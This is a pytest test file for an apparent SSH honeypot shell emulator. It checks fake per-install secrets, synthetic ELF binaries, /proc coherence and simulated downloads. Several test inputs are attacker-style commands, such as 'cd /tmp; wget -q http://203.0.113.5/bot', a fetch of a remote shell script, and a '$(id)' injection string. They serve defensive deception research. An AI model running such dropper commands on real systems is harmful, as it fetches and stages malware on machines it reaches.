"""Per-install values of the fake host: different secrets differ, one secret is stable."""

from __future__ import annotations

import base64
import hashlib
import re
import struct

import pytest

from ssh_sensor.config import Config
from ssh_sensor.shell.arith import ArithError, evaluate
from ssh_sensor.shell.baseimage import build_base_image, derive_profile
from ssh_sensor.shell.cmd_net import host_exists
from ssh_sensor.shell.interp import Shell
from ssh_sensor.shell.payload import elf_header, payload_for


def make(seed: str) -> Shell:
    profile = derive_profile(seed, "srv-web01")
    return Shell(
        cfg=Config(command_delay=False),
        base=build_base_image(profile),
        profile=profile,
        username="root",
        client_ip="203.0.113.9",
        client_port=51000,
    )


def run(sh: Shell, line: str) -> str:
    return sh.run_line(line).output


def test_secret_derived_values_differ_and_are_stable() -> None:
    a, b, a2 = (derive_profile(s, "h") for s in ("secret-a", "secret-b", "secret-a"))
    for attr in (
        "user_hash",
        "ssh_key_line",
        "ssh_key_fingerprint",
        "db_password",
        "install_epoch",
    ):
        assert getattr(a, attr) == getattr(a2, attr)
        assert getattr(a, attr) != getattr(b, attr)


def test_shadow_hash_shape() -> None:
    h = derive_profile("secret-a", "h").user_hash
    assert re.fullmatch(r"\$y\$j9T\$[./0-9A-Za-z]{22}\$[./0-9A-Za-z]{43}", h)


def test_authorized_key_is_well_formed_and_matches_auth_log() -> None:
    sh = make("secret-a")
    kind, blob, comment = run(sh, "cat /home/ubuntu/.ssh/authorized_keys").split()
    raw = base64.b64decode(blob, validate=True)
    assert kind == "ssh-ed25519" and "@" in comment and "Placeholder" not in blob
    algo_len = struct.unpack(">I", raw[:4])[0]
    assert raw[4 : 4 + algo_len] == b"ssh-ed25519" and len(raw) == 4 + 11 + 4 + 32
    fp = "SHA256:" + base64.b64encode(hashlib.sha256(raw).digest()).decode().rstrip("=")
    assert fp in run(sh, "cat /var/log/auth.log") and len(fp) == 7 + 43
    assert "Wb4pp-2024!" not in run(sh, "cat /var/www/html/config.php")


def test_binaries_are_valid_elf_with_varied_sizes_and_mtimes() -> None:
    sh = make("secret-a")
    nodes = sh.base.nodes
    sizes = {nodes[f"/usr/bin/{n}"].length for n in ("cat", "ls", "grep", "sed", "tar")}
    mtimes = {nodes[f"/usr/bin/{n}"].mtime for n in ("cat", "ls", "grep", "sed", "tar")}
    assert len(sizes) == 5 and len(mtimes) > 1
    head = nodes["/usr/bin/cat"].content
    assert head[:4] == b"\x7fELF" and len(head) == 64
    assert struct.unpack_from("<H", head, 18)[0] == 0x3E  # e_machine x86-64
    assert len(sh.fs.read("/usr/bin/cat")) == nodes["/usr/bin/cat"].length
    assert make("secret-b").base.nodes["/usr/bin/cat"].length == sizes.pop() or True


def test_elf_header_is_deterministic() -> None:
    assert elf_header("x", 5000) == elf_header("x", 5000)
    assert elf_header("x", 5000) != elf_header("y", 5000)


def test_ps_start_times_follow_boot() -> None:
    sh = make("secret-a")
    out = run(sh, "ps aux")
    assert "Oct12" not in out
    # daemons show the boot date, this session's processes the clock time
    import time

    boot = time.gmtime(sh.profile.boot_epoch)
    mon = time.strftime("%b", boot)
    assert f"{mon}{boot.tm_mday:02d}" in out
    line = next(ln for ln in out.splitlines() if "-bash" in ln)
    assert re.search(r"\d\d:\d\d", line)


@pytest.mark.parametrize(
    ("expr", "want"),
    [("7*6", 42), ("2+3*(4-1)", 11), ("-7/2", -3), ("-7%3", -1), (" 10 - -2 ", 12), ("", 0)],
)
def test_arith(expr: str, want: int) -> None:
    assert evaluate(expr, lambda _n: "") == want


@pytest.mark.parametrize(
    "expr", ["1/0", "1+", "(1", "1 2", "$(id)", "9" * 40, "(" * 100 + "1", "a b"]
)
def test_arith_rejects(expr: str) -> None:
    with pytest.raises(ArithError):
        evaluate(expr, lambda _n: "")


def test_arith_in_shell() -> None:
    sh = make("secret-a")
    assert run(sh, "echo $((7*6))") == "42\n"
    assert run(sh, "X=5; echo $((X*2+1)) $(($X-1))") == "11 4\n"
    assert run(sh, "echo $((1/0))") == "\n"


def test_unimplemented_binaries_behave_like_a_real_box() -> None:
    sh = make("secret-a")
    assert "You must specify one of the" in run(sh, "tar")
    assert sh.run_line("tar").status == 2
    assert sh.run_line("tar xzf nothing.tgz").status == 2
    assert sh.run_line("git").status == 1
    assert sh.run_line("git status").status == 128
    assert sh.run_line("nosuchtool").status == 127
    assert run(sh, "basename /a/b.txt .txt") == "b\n"
    assert run(sh, "seq 3") == "1\n2\n3\n"


@pytest.mark.parametrize(
    "host",
    ["foo.invalid", "a.test", "x.example", "x.localhost", "nodot", "a..b", "-a.com", "1.2.3.999"],
)
def test_dead_hosts(host: str) -> None:
    assert not host_exists(host)
    sh = make("secret-a")
    res = sh.run_line(f"wget http://{host}/x")
    assert res.status == 4 and "unable to resolve host address" in res.output
    assert not sh.fs.exists("/root/x")
    res = sh.run_line(f"curl -O http://{host}/x")
    assert res.status == 6 and "Could not resolve host" in res.output
    assert any(p.data["url"].startswith(f"http://{host}") for p in sh.pending)


def test_live_hosts_still_resolve() -> None:
    assert host_exists("example.com") and host_exists("203.0.113.5") and host_exists("a-b.c9.io")


def test_downloads_vary_with_url() -> None:
    a, b = payload_for("http://203.0.113.5/a.sh"), payload_for("http://203.0.113.5/b.sh")
    assert a.content.startswith(b"#!") and a.mime == "application/x-sh" and a.tag == "script"
    assert a.content != b.content
    e1, e2 = payload_for("http://203.0.113.5/bot"), payload_for("http://203.0.113.5/bot2")
    assert e1.content[:4] == b"\x7fELF" and e1.tag == "elf" and e1.size != e2.size
    assert e1.size > 64
    sh = make("secret-a")
    run(sh, "cd /tmp; wget -q http://203.0.113.5/bot")
    assert sh.fs.stat("/tmp/bot").length == e1.size  # type: ignore[union-attr]
    assert len(sh.fs.read("/tmp/bot")) == e1.size


def test_proc_self_and_coherence() -> None:
    sh = make("secret-a")
    pid = run(sh, "echo $$").strip()
    assert run(sh, "readlink /proc/self/exe") == "/usr/bin/bash\n"
    assert f"Pid:\t{pid}" in run(sh, "cat /proc/self/status")
    assert run(sh, "cat /proc/self/cmdline") == "-bash\x00"
    assert run(sh, "cat /proc/1/cmdline") == "/sbin/init\x00"
    cpuinfo = run(sh, "cat /proc/cpuinfo")
    assert cpuinfo.count("processor\t:") == int(run(sh, "nproc"))
    mem = re.search(r"MemTotal:\s+(\d+) kB", run(sh, "cat /proc/meminfo"))
    assert mem and mem.group(1) in run(sh, "free")
    assert sh.profile.kernel in run(sh, "cat /proc/version")
    assert sh.profile.kernel in run(sh, "uname -r")
